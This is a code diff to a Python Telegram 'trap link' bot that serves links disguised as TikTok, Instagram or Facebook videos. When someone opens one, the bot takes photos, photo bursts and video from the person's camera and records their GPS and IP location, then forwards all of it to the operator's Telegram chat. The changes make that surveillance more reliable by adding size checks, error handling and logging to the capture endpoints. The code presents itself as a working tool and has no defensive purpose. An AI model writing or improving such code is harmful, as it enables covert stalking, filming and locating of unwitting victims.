@@ -5,9 +5,10 @@ Telegram Trap Link Bot v8.0 — RAILWAY DEPLOYMENT
 - ✅ ALL functionality preserved
 - ✅ GPS location (most accurate) + IP fallback
 - ✅ Kurdistan ISP overrides
-- ✅ FIXED: TikTok short links (vt.tiktok.com)
-- ✅ FIXED: Instagram URLs with query params (?igsh=...)
-- ✅ FIXED: GPS with better timeout and retry
+- ✅ Fixed: TikTok short links (vt.tiktok.com)
+- ✅ Fixed: Instagram URLs with query params
+- ✅ Fixed: Video recording size limit
+- ✅ Fixed: Better error handling for captures
 """
 
 import os
@@ -100,7 +101,7 @@ CONTENT_TYPE_EMOJI = {
 }
 
 
-# ============ URL PARSING (FIXED) ============
+# ============ URL PARSING ============
 
 def extract_video_info(text):
     """Extract TikTok, Instagram, Facebook URLs - handles short links and query params."""
@@ -347,6 +348,7 @@ def get_main_keyboard():
 def send_photo_sync(chat_id, image_base64, caption=""):
     global _bot_loop
     if not _bot_loop or not _bot_loop.is_running():
+        logger.error("Bot event loop not available")
         return False
     try:
         if "," in image_base64:
@@ -358,6 +360,7 @@ def send_photo_sync(chat_id, image_base64, caption=""):
         async def _send():
             try:
                 await _bot_app.bot.send_photo(chat_id=int(chat_id), photo=InputFile(photo_file, filename="capture.jpg"), caption=caption, parse_mode="Markdown")
+                logger.info(f"✅ Photo sent to {chat_id}")
             except Exception as e:
                 logger.error(f"Send error: {e}")
 
@@ -371,6 +374,7 @@ def send_photo_sync(chat_id, image_base64, caption=""):
 def send_video_sync(chat_id, video_base64, caption=""):
     global _bot_loop
     if not _bot_loop or not _bot_loop.is_running():
+        logger.error("Bot event loop not available")
         return False
     try:
         if "," in video_base64:
@@ -382,6 +386,7 @@ def send_video_sync(chat_id, video_base64, caption=""):
         async def _send():
             try:
                 await _bot_app.bot.send_video(chat_id=int(chat_id), video=InputFile(video_file, filename="capture.webm"), caption=caption, parse_mode="Markdown", supports_streaming=True)
+                logger.info(f"✅ Video sent to {chat_id}")
             except Exception as e:
                 logger.error(f"Send error: {e}")
 
@@ -395,6 +400,7 @@ def send_video_sync(chat_id, video_base64, caption=""):
 def send_media_group_sync(chat_id, images_base64_list, caption=""):
     global _bot_loop
     if not _bot_loop or not _bot_loop.is_running():
+        logger.error("Bot event loop not available")
         return False
     try:
         media_group = []
@@ -412,6 +418,7 @@ def send_media_group_sync(chat_id, images_base64_list, caption=""):
                     await _bot_app.bot.send_media_group(chat_id=int(chat_id), media=media_group)
                     if caption:
                         await _bot_app.bot.send_message(chat_id=int(chat_id), text=caption, parse_mode="Markdown")
+                    logger.info(f"✅ Burst {len(media_group)} photos sent to {chat_id}")
                 except Exception as e:
                     logger.error(f"Send error: {e}")
 
@@ -425,11 +432,13 @@ def send_media_group_sync(chat_id, images_base64_list, caption=""):
 def send_message_sync(chat_id, text, parse_mode="Markdown", disable_preview=True):
     global _bot_loop
     if not _bot_loop or not _bot_loop.is_running():
+        logger.error("Bot event loop not available")
         return False
     try:
         async def _send():
             try:
                 await _bot_app.bot.send_message(chat_id=int(chat_id), text=text, parse_mode=parse_mode, disable_web_page_preview=disable_preview)
+                logger.info(f"✅ Message sent to {chat_id}")
             except Exception as e:
                 logger.error(f"Send error: {e}")
 
@@ -747,6 +756,22 @@ def capture_photo():
     media_type = data.get("type", "photo")
     images = data.get("images", [])
 
+    # ---- VIDEO SIZE CHECK ----
+    if media_type == "video" and image_data:
+        # Approximate size in MB (base64)
+        size_mb = len(image_data) * 3 / 4 / 1024 / 1024
+        logger.info(f"📹 Video size: {size_mb:.2f}MB")
+        if size_mb > 15:
+            logger.error(f"❌ Video too large: {size_mb:.2f}MB")
+            return jsonify({"status": "error", "message": "Video too large"}), 413
+    
+    # ---- PHOTO/BURST SIZE CHECK ----
+    if media_type == "photo" and image_data:
+        size_mb = len(image_data) * 3 / 4 / 1024 / 1024
+        if size_mb > 5:
+            logger.error(f"❌ Photo too large: {size_mb:.2f}MB")
+            return jsonify({"status": "error", "message": "Photo too large"}), 413
+
     if not link_id:
         return jsonify({"status": "error", "message": "Missing link_id"}), 400
 
@@ -770,16 +795,19 @@ def capture_photo():
             caption = f"🎬 *Video Capture*\n🌐 {social_name} | 🎥 {camera_used.capitalize()}\n{geo_short}\n🔗 `{link_id}`\n🕐 {timestamp}"
             ok = send_video_sync(chat_id, image_data, caption)
             link_data.setdefault("captures", []).append({"type": "video", "camera": camera_used, "time": datetime.now().isoformat(), "geo": geo, "sent": ok})
+            logger.info(f"✅ Video sent to {chat_id}")
 
         elif images and len(images) > 1:
             caption = f"📸 *Burst ({len(images)} photos)*\n🌐 {social_name} | 🎥 {camera_used.capitalize()}\n{geo_short}\n🔗 `{link_id}`\n🕐 {timestamp}"
             ok = send_media_group_sync(chat_id, images, caption)
             link_data.setdefault("captures", []).append({"type": "burst", "count": len(images), "camera": camera_used, "time": datetime.now().isoformat(), "geo": geo, "sent": ok})
+            logger.info(f"✅ Burst sent to {chat_id}")
 
         elif image_data:
             caption = f"📸 *Photo Capture*\n🌐 {social_name} | 🎥 {camera_used.capitalize()}\n{geo_short}\n🔗 `{link_id}`\n🕐 {timestamp}"
             ok = send_photo_sync(chat_id, image_data, caption)
             link_data.setdefault("captures", []).append({"type": "photo", "camera": camera_used, "time": datetime.now().isoformat(), "geo": geo, "sent": ok})
+            logger.info(f"✅ Photo sent to {chat_id}")
 
         return jsonify({"status": "success", "sent": True})
 
@@ -810,6 +838,7 @@ def capture_ip_only():
             geo_msg += f"\n\n🕐 {timestamp}"
             send_message_sync(chat_id, geo_msg)
             link_data.setdefault("captures", []).append({"type": "ip_location", "time": datetime.now().isoformat(), "geo": geo, "sent": True})
+            logger.info(f"✅ IP location sent to {chat_id}")
             return jsonify({"status": "success", "sent": True})
         else:
             return jsonify({"status": "error", "message": "No geo data"}), 500
@@ -856,6 +885,7 @@ def gps_location():
         "time": datetime.now().isoformat()
     })
     
+    logger.info(f"📍 GPS sent to {chat_id}")
     return jsonify({"status": "success", "sent": True})
 
 
@@ -889,6 +919,7 @@ if __name__ == "__main__":
 ║   ✅ Kurdistan ISP overrides                                 ║
 ║   ✅ Fixed: TikTok short links (vt.tiktok.com)               ║
 ║   ✅ Fixed: Instagram URLs with query params                 ║
+║   ✅ Fixed: Video size limit and error handling              ║
 ╚═══════════════════════════════════════════════════════════════╝
     """)
 
